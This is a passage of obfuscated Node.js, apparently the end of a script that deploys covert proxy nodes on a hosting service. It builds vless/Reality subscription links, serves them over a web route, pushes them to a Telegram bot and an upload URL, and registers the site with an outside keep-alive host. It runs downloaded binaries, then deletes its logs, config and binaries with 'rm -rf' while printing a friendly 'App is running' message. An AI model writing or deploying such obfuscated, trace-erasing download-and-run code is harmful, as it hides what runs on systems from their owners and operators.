_0x2feb7b=_0x41fdf7(0x193)+KEY+'@'+_0x1364e9+':'+REALITY_PORT+_0x41fdf7(0xc2)+publicKey+_0x41fdf7(0xf9)+NAME+'-'+_0x249949;_0x2b4548+=_0x2feb7b;}console[_0x41fdf7(0xce)](Buffer['from'](_0x2b4548)['toString']('base64')),fs[_0x41fdf7(0xe8)](subPath,Buffer[_0x41fdf7(0x189)](_0x2b4548)[_0x41fdf7(0x147)]('base64')),fs[_0x41fdf7(0xe8)](listPath,_0x2b4548,_0x41fdf7(0x157)),console[_0x41fdf7(0xce)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),sendTelegram(),uplodNodes(),app['get']('/'+SUB_PATH,(_0x3c7b9b,_0x5288ea)=>{const _0x48d944=_0x41fdf7,_0x1f6efd=Buffer['from'](_0x2b4548)[_0x48d944(0x147)](_0x48d944(0x155));_0x5288ea[_0x48d944(0x190)](_0x48d944(0xe4),_0x48d944(0x16e)),_0x5288ea[_0x48d944(0x16d)](_0x1f6efd);}),_0x5c92d9(_0x2b4548);},0x7d0);});}}function _0x5d51(_0x1da8ae,_0x1769f6){const _0x483364=_0x4833();return _0x5d51=function(_0x5d5101,_0x26cc4c){_0x5d5101=_0x5d5101-0xbb;let _0x215920=_0x483364[_0x5d5101];return _0x215920;},_0x5d51(_0x1da8ae,_0x1769f6);}function cleanFiles(){setTimeout(()=>{const _0x422bf2=_0x5d51,_0x33855a=[bootLogPath,configPath,listPath,sysutilPath,networkdPath,wukongPath,npmPath];if(WUKONG_PORT)_0x33855a[_0x422bf2(0x174)](npmPath);else WUKONG_SERVER&&WUKONG_KEY&&_0x33855a[_0x422bf2(0x174)](wukongPath);exec('rm\x20-rf\x20'+_0x33855a['join']('\x20')+_0x422bf2(0x148),_0x539e33=>{const _0x2995cb=_0x422bf2;console[_0x2995cb(0x10f)](),console[_0x2995cb(0xce)]('App\x20is\x20running'),console[_0x2995cb(0xce)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}async function sendTelegram(){const _0x3cc703=_0x35df8d;if(!BOT_TOKEN||!CHAT_ID){console[_0x3cc703(0xce)](_0x3cc703(0x164));return;}try{const _0x22df23=fs[_0x3cc703(0xcb)](path[_0x3cc703(0x13d)](FILE_PATH,_0x3cc703(0xe2)),_0x3cc703(0x157)),_0x2be639=_0x3cc703(0x107)+BOT_TOKEN+'/sendMessage',_0x5669a2=NAME[_0x3cc703(0x10d)](/[_*[\]()~`>#+=|{}.!-]/g,_0x3cc703(0x114)),_0x22f94b={'chat_id':CHAT_ID,'text':'**'+_0x5669a2+'节点推送通知**\x0a```'+_0x22df23+_0x3cc703(0x12c),'parse_mode':_0x3cc703(0x151)};await axios[_0x3cc703(0x18e)](_0x2be639,null,{'params':_0x22f94b}),console[_0x3cc703(0xce)](_0x3cc703(0xd9));}catch(_0x5111f7){console[_0x3cc703(0x11d)](_0x3cc703(0x159),_0x5111f7);}}async function uplodNodes(){const _0x427ee6=_0x35df8d;if(UPLOAD_URL&&PROJECT_URL){const _0xf99d88=PROJECT_URL+'/'+SUB_PATH,_0x842051={'subscription':[_0xf99d88]};try{const _0xb2db97=await axios[_0x427ee6(0x18e)](UPLOAD_URL+_0x427ee6(0x105),_0x842051,{'headers':{'Content-Type':'application/json'}});if(_0xb2db97[_0x427ee6(0x17e)]===0xc8)console[_0x427ee6(0xce)](_0x427ee6(0x175));else return null;}catch(_0xacac60){if(_0xacac60[_0x427ee6(0x12f)]){if(_0xacac60[_0x427ee6(0x12f)][_0x427ee6(0x17e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x427ee6(0x124)](listPath))return;const _0x50ebf9=fs['readFileSync'](listPath,_0x427ee6(0x10c)),_0x525dcc=_0x50ebf9[_0x427ee6(0x139)]('\x0a')[_0x427ee6(0xbc)](_0x3fcd27=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x427ee6(0xfc)](_0x3fcd27));if(_0x525dcc[_0x427ee6(0xf6)]===0x0)return;const _0x54f3bd=JSON['stringify']({'nodes':_0x525dcc});try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x54f3bd,{'headers':{'Content-Type':'application/json'}});if(response[_0x427ee6(0x17e)]===0xc8)console[_0x427ee6(0xce)](_0x427ee6(0x175));else return null;}catch(_0xe55df5){return null;}}else return;}}async function AddVisitTask(){const _0x2f4178=_0x35df8d;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x13ef5c=await axios[_0x2f4178(0x18e)]('https://keep.gvrander.eu.org/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f4178(0xca)}});console['log'](_0x2f4178(0x11b));}catch(_0x1df085){console[_0x2f4178(0x11d)](_0x2f4178(0x188)+_0x1df085[_0x2f4178(0xc9)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),AddVisitTask(),cleanFiles();}startserver(),app[_0x35df8d(0x161)](PORT,()=>console[_0x35df8d(0xce)]('server\x20is\x20running\x20on\x20port:'+PORT+'!'));
